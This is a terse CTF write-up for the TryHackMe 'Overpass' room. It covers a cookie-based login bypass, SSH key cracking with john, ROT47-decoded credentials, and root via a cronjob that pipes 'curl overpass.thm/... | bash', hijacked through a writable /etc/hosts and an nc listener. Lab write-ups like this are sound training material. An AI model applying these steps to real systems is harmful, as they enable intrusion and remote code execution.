---
title: Overpass
description: 'Exploiting client side "sessionToken" and exploting a cronjon and bad permissions on the hosts file'
pubDate: 2020-12-27
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/2048656e072dd7caffe455ae2d44b65f.png'
---

## FOOTHOLD / USER
    - /admin
        - /login.js
            - see the `else`, this needs a cookie called `SessionToken` with or without a value

    - /usr/share/john/ssh2john.py james.rsa.enc > james.rsa.hash
    - john --wordlist=/usr/share/wordlists/rockyou.txt james.rsa.hash
        james:james13
    - ssh -i james.rsa.enc james@10.10.44.68 <- james13


    - cat .overpass
        - ,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
        - Decrypt with ROT47 with `94 printable ASCII characters from ! (33) to ~ (126) (ie: Rot47)` (https://www.dcode.fr/rot-cipher)
            - [{"name":"System","pass":"saydrawnlyingpicture"}]



## ROOT
    - linpeas.sh
        - * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
        - writable by me: /etc/hosts
    - change /etc/hosts -> <my tun0 IP> to overpass.thm
    - run webserver at port 80: sudo python3 -m http.server 80
    - listen `nc -lvnp 4444`
